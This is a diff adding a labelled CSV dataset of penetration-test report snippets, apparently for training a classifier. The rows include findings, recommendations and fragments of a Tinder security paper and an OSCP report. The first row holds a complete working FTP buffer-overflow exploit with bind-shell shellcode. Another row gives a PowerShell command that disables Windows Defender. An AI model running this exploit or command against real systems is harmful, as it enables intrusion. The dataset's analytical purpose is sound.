@@ -1,0 +1,141 @@
+text,label,clean_text
+"PoC: Modifications to the existing exploit were needed and are marked with comments:
+
+  ###################################
+  # Ability Server 2.34 FTP STOR Buffer Overflow
+  # Advanced, secure and easy to use FTP Server.
+  # 21 Oct 2004 - muts
+  ###################################
+  # D:\BO>ability-2.34-ftp-stor.py
+  ###################################
+  # D:\data\tools>nc -v 127.0.0.1 4444
+  # localhost [127.0.0.1] 4444 (?) open
+  # Microsoft Windows XP [Version 5.1.2600]
+  # (C) Copyright 1985-2001 Microsoft Corp.
+  # D:\Program Files\abilitywebserver>
+  ###################################
+
+  import ftplib
+  from ftplib import FTP
+  import struct
+  print ""\n\n################################""
+  print ""\nAbility Server 2.34 FTP STOR buffer Overflow""
+  print ""\nFor Educational Purposes Only!\n""
+  print ""###################################""
+
+  # Shellcode taken from Sergio Alvarez's ""Win32 Stack Buffer Overflow Tutorial""
+
+  sc = ""\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66""
+  sc += ""\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6""
+  sc += ""\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba""
+  sc += ""\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb""
+  sc += ""\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc""
+  sc += ""\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61""
+  sc += ""\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70""
+  sc += ""\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44""
+  sc += ""\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7""
+  sc += ""\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69""
+  sc += ""\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9""
+  sc += ""\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0""
+  sc += ""\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3""
+  sc += ""\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7""
+  sc += ""\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0""
+  sc += ""\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67""
+  sc += ""\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1""
+  sc += ""\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0""
+  sc += ""\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88""
+  sc += ""\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d""
+  sc += ""\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95""
+  sc += ""\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2""
+  # Change RET address if need be.
+  buffer = '\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\x42'*32+sc # RET Windows 2000 Server SP4
+  #buffer = '\x41'*970+struct.pack('<L', 0x7D17D737)+'\x42'*32+sc # RET Windows XP SP2
+  try:
+      # Edit the IP, Username and Password.
+      ftp = FTP('127.0.0.1')
+      ftp.login('ftp','ftp')
+      print ""\nEvil Buffer sent...""
+      print ""\nTry connecting with netcat to port 4444 on the remote machine.""
+  except:
+      print ""\nCould not Connect to FTP Server.""
+
+  try:
+      ftp.transfercmd(""STOR "" + buffer)
+  except:
+      print ""\nDone.""",Exploitation,poc modifications to the existing exploit were needed and are marked with comments ability server 234 ftp stor buffer overflow advanced secure and easy to use ftp server 21 oct 2004 muts dboability234ftpstorpy ddatatoolsnc v 127001 4444 localhost 127001 4444 open microsoft windows xp version 512600 c copyright 19852001 microsoft corp dprogram filesabilitywebserver import ftplib from ftplib import ftp import struct print nn print nability server 234 ftp stor buffer overflow print nfor educational purposes onlyn print shellcode taken from sergio alvarezs win32 stack buffer overflow tutorial sc xd9xeexd9x74x24xf4x5bx31xc9xb1x5ex81x73x17xe0x66 sc x1cxc2x83xebxfcxe2xf4x1cx8ex4axc2xe0x66x4fx97xb6 sc x1ax38xd6x95x87x97x98xc4x67xf7xa4x6bx6ax57x49xba sc x7ax1dx29x6bx62x97xc3x08x8dx1exf3x20x39x42x9fxbb sc xa4x14xc2xbex0cx2cx9bx84xedx05x49xbbx6ax97x99xfc sc xedx07x49xbbx6ex4fxaax6ex28x12x2ex1fxb0x95x05x61 sc x8ax1cxc3xe0x66x4bx94xb3xefxf9x2axc7x66x1cxc2x70 sc x67x1cxc2x56x7fx04x25x44x7fx6cx2bx05x2fx9ax8bx44 sc x7cx6cx05x44xcbx32x2bx39x6fxe9x6fx2bx8bxe0xf9xb7 sc x35x2ex9dxd3x54x1cx99x6dx2dx3cx93x1fxb1x95x1dx69 sc xa5x91xb7xf4x0cx1bx9bxb1x35xe3xf6x6fx99x49xc6xb9 sc xefx18x4cx02x94x37xe5xb4x99x2bx3dxb5x56x2dx02xb0 sc x36x4cx92xa0x36x5cx92x1fx33x30x4bx27x57xc7x91xb3 sc x0ex1exc2xf1x3ax95x22x8ax76x4cx95x1fx33x38x91xb7 sc x99x49xeaxb3x32x4bx3dxb5x46x95x05x88x25x51x86xe0 sc xefxffx45x1ax57xdcx4fx9cx42xb0xa8xf5x3fxefx69x67 sc x9cx9fx2exb4xa0x58xe6xf0x22x7ax05xa4x42x20xc3xe1 sc xefx60xe6xa8xefx60xe6xacxefx60xe6xb0xebx58xe6xf0 sc x32x4cx93xb1x37x5dx93xa9x37x4dx91xb1x99x69xc2x88 sc x14xe2x71xf6x99x49xc6x1fxb6x95x24x1fx13x1cxaax4d sc xbfx19x0cx1fx33x18x4bx23x0cxe3x3dxd6x99xcfx3dx95 sc x66x74x32x6ax62x43x3dxb5x62x2dx19xb3x99xccxc2 change ret address if need be buffer x41966structpackl 0x7c2fa0f7x4232sc ret windows 2000 server sp4 buffer x41970structpackl 0x7d17d737x4232sc ret windows xp sp2 try edit the ip username and password ftp ftp127001 ftploginftpftp print nevil buffer sent print ntry connecting with netcat to port 4444 on the remote machine except print ncould not connect to ftp server try ftptransfercmdstor buffer except print ndone
+Used insecure YAML parser to execute OS commands via a manipulated configuration file.,Exploitation,used insecure yaml parser to execute os commands via a manipulated configuration file
+"The custom encryption module did not validate the key size before accepting user-provided keys, allowing weak or improperly sized inputs that failed to meet minimum security standards for AES encryption.",Crypto Misuse,the custom encryption module did not validate the key size before accepting userprovided keys allowing weak or improperly sized inputs that failed to meet minimum security standards for aes encryption
+1 Introduction 2,Formatting,1 introduction 2
+Performed reverse DNS lookups on discovered IP ranges to identify hostnames and network structure within the internal environment.,Discovery,performed reverse dns lookups on discovered ip ranges to identify hostnames and network structure within the internal environment
+Temporary password was displayed in plain text during password reset process.,Information Disclosure,temporary password was displayed in plain text during password reset process
+"Backdoor accounts were created on the server with legitimate-looking usernames, allowing re-entry even after password resets.",Post - Exploitation,backdoor accounts were created on the server with legitimatelooking usernames allowing reentry even after password resets
+Deploying a centralized logging solution like ELK or Splunk can aid in faster detection of anomalous behavior.,Support - Recommendation,deploying a centralized logging solution like elk or splunk can aid in faster detection of anomalous behavior
+"During the engagement, the red team deployed a PowerShell script that disabled Windows Defenders real-time protection using `Set-MpPreference -DisableRealtimeMonitoring $true`, allowing payloads to execute without detection.",Operational TTPs,during the engagement the red team deployed a powershell script that disabled windows defenders realtime protection using setmppreference disablerealtimemonitoring true allowing payloads to execute without detection
+"Created a scheduled task set to run a reverse shell binary on user login, granting the attacker persistent access even after reboots.",Post - Exploitation,created a scheduled task set to run a reverse shell binary on user login granting the attacker persistent access even after reboots
+**Steps to reproduce**: Execute the injection on the taxid query string parameter.,Exploitation,steps to reproduce execute the injection on the taxid query string parameter
+"The house cleaning portions of the assessment ensures that remnants of
+the penetration test are removed. Often fragments of tools or user
+accounts are left on an organizations computer which can cause security
+issues down the road. Ensuring that we are meticulous and no remnants
+of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed,
+John removed all user accounts and passwords as well as the Meterpreter
+services installed on the system. OffSec should not have to remove any user
+accounts or services from the system.",Post - Exploitation,the house cleaning portions of the assessment ensures that remnants of the penetration test are removed often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road ensuring that we are meticulous and no remnants of our penetration test are left over is important after the trophies on both the lab network and exam network were completed john removed all user accounts and passwords as well as the meterpreter services installed on the system offsec should not have to remove any user accounts or services from the system
+"Mobile app failed to enforce HTTPS, exposing login credentials over open Wi-Fi.",Exploitation,mobile app failed to enforce https exposing login credentials over open wifi
+"With this we can conclude an answer to Does Tinder correctly implement HTTPS during communication?, namely that the Tinder API uses HTTPS to secure traffic to their service. Although we were able to circumvent this (see section 3.2.1) we had to install a custom root certificate authority on our client devices, which required full administrative control of the devices. Should this be a concern for Tinder they could consider certificate pinning[7].",Support - Recommendation,with this we can conclude an answer to does tinder correctly implement https during communication namely that the tinder api uses https to secure traffic to their service although we were able to circumvent this see section 321 we had to install a custom root certificate authority on our client devices which required full administrative control of the devices should this be a concern for tinder they could consider certificate pinning7
+"The organization does not enforce multi-factor authentication for remote VPN access. Although technically supported, the current policy classifies MFA as optional.",Policy,the organization does not enforce multifactor authentication for remote vpn access although technically supported the current policy classifies mfa as optional
+Conduct annual tabletop incident response exercises to improve preparedness and identify gaps in coordination.,Support - Recommendation,conduct annual tabletop incident response exercises to improve preparedness and identify gaps in coordination
+"User passwords were stored using unsalted MD5 hashes, which can be cracked rapidly using rainbow tables. Stronger, salted algorithms like bcrypt are recommended.",Crypto Misuse,user passwords were stored using unsalted md5 hashes which can be cracked rapidly using rainbow tables stronger salted algorithms like bcrypt are recommended
+"The encryption routine used ECB mode, which does not sufficiently protect against block replay attacks. A mode like CBC or GCM should be used instead.",Crypto Misuse,the encryption routine used ecb mode which does not sufficiently protect against block replay attacks a mode like cbc or gcm should be used instead
+Used responder to poison LLMNR requests and capture NTLMv2 hashes on the internal network.,Exploitation,used responder to poison llmnr requests and capture ntlmv2 hashes on the internal network
+**Active Directory Set**:,Formatting,active directory set
+"A global key derivation pattern based on incremental user IDs (e.g., `key = hash(1000 + user_id)`) made it trivial to guess keys for other users.",Crypto Misuse,a global key derivation pattern based on incremental user ids eg key hash1000 user_id made it trivial to guess keys for other users
+Finally we settled on an implementation using SSLsplit4. This allowed us to use our own certificate authority to generate proper SSL certificates for any endpoint connected to during our tests. By importing this authority we were able to run the Tinder application while logging all traffic to plaintext files for later inspection. However for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work. ,Discovery,finally we settled on an implementation using sslsplit4 this allowed us to use our own certificate authority to generate proper ssl certificates for any endpoint connected to during our tests by importing this authority we were able to run the tinder application while logging all traffic to plaintext files for later inspection however for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work
+4.1 Offline analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting,41 offline analysis 6
+ Due to incomplete obfuscation of the APK10 file certain resources could easily be identified. The base URL of the Tinder API was also revealed to be https://api.gotinder.com.,Discovery,due to incomplete obfuscation of the apk10 file certain resources could easily be identified the base url of the tinder api was also revealed to be httpsapigotindercom
+"An outdated jQuery library (1.7.2) was discovered on the web application, known to be affected by CVE-2015-9251, enabling XSS via cross-domain requests.",Vulnerability - Known CVE,an outdated jquery library 172 was discovered on the web application known to be affected by cve20159251 enabling xss via crossdomain requests
+"Planted a Python web shell into an exposed web directory, accessible via an inconspicuous URL, providing command execution through HTTP requests.",Post - Exploitation,planted a python web shell into an exposed web directory accessible via an inconspicuous url providing command execution through http requests
+"### Target #1 - 192.168.x.1
+
+#### Service Enumeration
+
+##### Port Scan Results
+
+|IP Address|Ports Open|
+|---|---|
+|192.168.x.1|**TCP**: 8080<br/>**UDP**: 1433, 3389|",Discovery,target 1 192168x1 service enumeration port scan results ip addressports open 192168x1tcp 8080brudp 1433 3389
+4.2.3 Targeting authentication . . . . . . . . . . . . . . . . . 9,Formatting,423 targeting authentication 9
+" If it is possible to log in to the Tinder API using a random access token from another application this may enable third parties to profile users of Tinder or manipulate existing contacts, current recommendations, and chat conversations",Discovery,if it is possible to log in to the tinder api using a random access token from another application this may enable third parties to profile users of tinder or manipulate existing contacts current recommendations and chat conversations
+Attackers reused session tokens from stolen browser sessions to bypass login.,Exploitation,attackers reused session tokens from stolen browser sessions to bypass login
+User tokens remain valid after logout or password reset.,Implementation Flaw,user tokens remain valid after logout or password reset
+ To complete our MitM setup we needed to proxy HTTP(S) requests and fake certificates for the various requested web resources. Because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the WiFi settings. Reason for this is that applications on Android don't use the proxy as configured in the WiFi settings. As such we required a proxy which could generate SSL certificates for the various end-points requested by the application. ,Discovery,to complete our mitm setup we needed to proxy https requests and fake certificates for the various requested web resources because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the wifi settings reason for this is that applications on android dont use the proxy as configured in the wifi settings as such we required a proxy which could generate ssl certificates for the various endpoints requested by the application
+"The password hashing implementation used `Math.random()` to generate salts. This method is not cryptographically secure and could lead to predictable salts, allowing precomputed dictionary attacks using rainbow tables.",Crypto Misuse,the password hashing implementation used mathrandom to generate salts this method is not cryptographically secure and could lead to predictable salts allowing precomputed dictionary attacks using rainbow tables
+"The login endpoint does not implement rate limiting, allowing attackers to brute force credentials without restriction.",Implementation Flaw,the login endpoint does not implement rate limiting allowing attackers to brute force credentials without restriction
+1http://forum.xda-developers.com/showthread.php?t=1910873,Support - Tool Reference,1httpforumxdadeveloperscomshowthreadphpt1910873
+ ## Offensive Security OSCP Exam Penetration Test Report The OffSec Lab and Exam penetration test report contains all efforts that were conducted in order to pass the OffSec course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.,Background Information,offensive security oscp exam penetration test report the offsec lab and exam penetration test report contains all efforts that were conducted in order to pass the offsec course this report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam the purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the offsec certified professional
+Exported entire customer database from a misconfigured public S3 bucket.,Operational TTPs,exported entire customer database from a misconfigured public s3 bucket
+"During invalid input processing, the system throws unhandled exceptions that leak internal stack trace information to the client.",Implementation Flaw,during invalid input processing the system throws unhandled exceptions that leak internal stack trace information to the client
+Revealing software versions or internal IPs via headers like Server: or X-Powered-By.,Information Disclosure,revealing software versions or internal ips via headers like server or xpoweredby
+3.1 Static analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting,31 static analysis 4
+4.2.2 Insecure traffic . . . . . . . . . . . . . . . . . . . . . . 8,Formatting,422 insecure traffic 8
+The static analysis of the Tinder application was by decompiling the source files from a retrieved APK file using APK to Java1. This APK file has been retrieved from a rooted android device. The decompiler used was the freely available jd-gui[4].,Discovery,the static analysis of the tinder application was by decompiling the source files from a retrieved apk file using apk to java1 this apk file has been retrieved from a rooted android device the decompiler used was the freely available jdgui4
+Local enumeration revealed a SUID binary /usr/bin/vulnprog with improper bounds checking. Exploiting a buffer overflow allowed escalation to root.,Privilege Escalation,local enumeration revealed a suid binary usrbinvulnprog with improper bounds checking exploiting a buffer overflow allowed escalation to root
+"Compromised Jenkins pipeline through script console, allowing arbitrary code to run on build agents.",Exploitation,compromised jenkins pipeline through script console allowing arbitrary code to run on build agents
+"This attack shows that it is possible to write a simple chat bot, even if
+you would have to resort to someone manually creating matches with other
+users. There are strong indicators that spam bots are active on Tinder [8],
+we suspect that automation like we demonstrated is used for these purposes.",Exploitation,this attack shows that it is possible to write a simple chat bot even if you would have to resort to someone manually creating matches with other users there are strong indicators that spam bots are active on tinder 8 we suspect that automation like we demonstrated is used for these purposes
+8http://www.kontagent.com/,Support - Tool Reference,8httpwwwkontagentcom
+"Some issues remain, including third-party analytics receiving sensitive data over insecure channels.",Exploitation,some issues remain including thirdparty analytics receiving sensitive data over insecure channels
+"In this paper we will look in to the risks of using Tinder, what information is sent where and how securely this information is transported over the internet. We also look into whether information is stored at a third party or even Tinder itself. ",Background Information,in this paper we will look in to the risks of using tinder what information is sent where and how securely this information is transported over the internet we also look into whether information is stored at a third party or even tinder itself
+Abused overly permissive IAM roles to escalate privileges in AWS environment.,Privilege Escalation,abused overly permissive iam roles to escalate privileges in aws environment
+Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation,exposed jenkins dashboard allowed anonymous command execution on build nodes
+Passwordmaker uses charAt() which could be exploited in a side-channel attack.,Discovery,passwordmaker uses charat which could be exploited in a sidechannel attack
+MySQL service allowed login with root and no password.,Credential Access,mysql service allowed login with root and no password
+Company policy allows unrestricted access to production databases by all developers. This contradicts the principle of least privilege and exposes sensitive data to potential abuse.,Policy,company policy allows unrestricted access to production databases by all developers this contradicts the principle of least privilege and exposes sensitive data to potential abuse
+Accessed internal documentation from exposed Confluence server using default credentials.,Credential Access,accessed internal documentation from exposed confluence server using default credentials
+"{Joris.Claassen,Leendert.vanDuijn,Mick.Pouw,Esan.Wit}@os3.nl",Background Information,jorisclaassenleendertvanduijnmickpouwesanwitos3nl
+4.2 Dynamic analysis . . . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting,42 dynamic analysis 7
+User was tricked into clicking a link that appeared to belong to their company domain but led to a malicious site that stole credentials.,Exploitation,user was tricked into clicking a link that appeared to belong to their company domain but led to a malicious site that stole credentials
